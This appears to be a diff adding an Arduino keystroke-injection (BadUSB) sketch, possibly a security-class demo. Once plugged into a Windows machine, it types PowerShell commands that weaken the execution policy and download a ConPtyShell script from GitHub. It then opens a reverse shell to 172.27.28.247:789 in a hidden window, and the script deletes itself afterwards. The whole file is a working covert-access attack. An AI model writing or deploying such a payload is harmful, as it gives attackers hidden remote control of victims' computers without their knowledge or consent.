@@ -1,0 +1,113 @@
+#include <Keyboard.h>
+
+void setup() {
+
+pinMode(3, INPUT_PULLUP); 
+if(digitalRead(3) == LOW) while(1);
+
+Keyboard.begin();
+delay(1000);
+
+Keyboard.press(KEY_LEFT_GUI);
+Keyboard.press('r');
+Keyboard.releaseAll();
+delay(1000);
+
+Keyboard.print(F("powershell"));
+delay(1000);
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(1000);
+
+Keyboard.println(F(
+"$scriptContent = @\""
+));
+delay(500); // Delay 500 milliseconds
+
+Keyboard.println(F(
+"Set-ExecutionPolicy RemoteSigned -Scope CurrentUser"
+));
+delay(500);
+
+Keyboard.println(F(
+"Invoke-WebRequest -Uri \" https://raw.githubusercontent.com/HuuKienIT/demoATBM/refs/heads/main/Invoke-ConPtyShell.ps1\" -OutFile \"Invoke-ConPtyShell.ps1\" -UseBasicParsing"
+));
+delay(500);
+
+Keyboard.println(F(
+". .\\Invoke-ConPtyShell.ps1"
+));
+delay(500);
+
+Keyboard.println(F(
+"Invoke-ConPtyShell 172.27.28.247 789"
+));
+delay(500);
+
+Keyboard.print(F(
+"\n"
+));
+delay(500);
+
+Keyboard.println(F(
+"del C:\\Users\\nguca\\demo2.ps1"
+));
+delay(500);
+
+Keyboard.print(F(
+"\"@\n"
+));
+delay(500);
+
+Keyboard.print(F(
+"\n"
+));
+delay(500);
+
+Keyboard.println(F(
+"$filePath = \"demo2.ps1\""
+));
+delay(1000);
+
+Keyboard.println(F(
+"$scriptContent \| Out-File -FilePath $filePath -Encoding utf8"
+));
+delay(1000);
+
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(1000);
+
+Keyboard.println(F(
+"Start-Process powershell.exe -ArgumentList \"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \`\"C:\\Users\\nguca\\demo2.ps1\`\"\" "
+));
+
+// 
+// Start-Process powershell.exe -ArgumentList \"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \`\"C:\\Users\\nguca\\demo2.ps1\`\"\"
+
+delay(1000);
+
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(1000);
+
+
+Keyboard.press(KEY_RIGHT_ALT);
+Keyboard.press(KEY_TAB);
+Keyboard.releaseAll();
+delay(1000);
+
+Keyboard.print(F("exit"));
+delay(1000);
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(1000);
+
+Keyboard.end();
+}
+void type(int key, boolean release) {
+Keyboard.press(key);
+if(release)
+Keyboard.release(key);
+}
+void loop(){}
